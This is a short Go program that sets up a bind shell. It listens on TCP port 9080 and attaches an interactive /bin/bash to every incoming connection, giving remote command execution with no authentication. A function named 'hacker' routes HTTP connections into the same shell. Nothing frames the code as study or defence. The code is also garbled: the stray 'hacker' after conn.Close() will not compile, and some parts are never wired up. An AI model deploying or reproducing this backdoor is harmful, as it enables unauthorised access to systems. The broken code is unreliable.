package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os/exec"
)

type contextKey struct {
	key string
}

var ConnContextKey = &contextKey{"http-conn"}

func main() {

	listener,err := net.Listen("tcp",":9080")
	if err != nil {
		log.Fatalf("Could not listen on port")
	}
	for {
		conn,err:=listener.Accept()
		if err!= nil{
			fmt.Printf("Error while trying to accept a connection %v\n\n",err)
		}
		go handle(conn)
	}
}

func hacker(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("%v", r)
	io.WriteString(w, "We are in la la land\n\n")
	conn := r.Context().Value(ConnContextKey).(net.Conn)
	go handle(conn)

}
func handle(conn net.Conn) {
	defer conn.Close()hacker
	rp, wp := io.Pipe()

	cmd := exec.Command("/bin/bash", "-i")
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
}
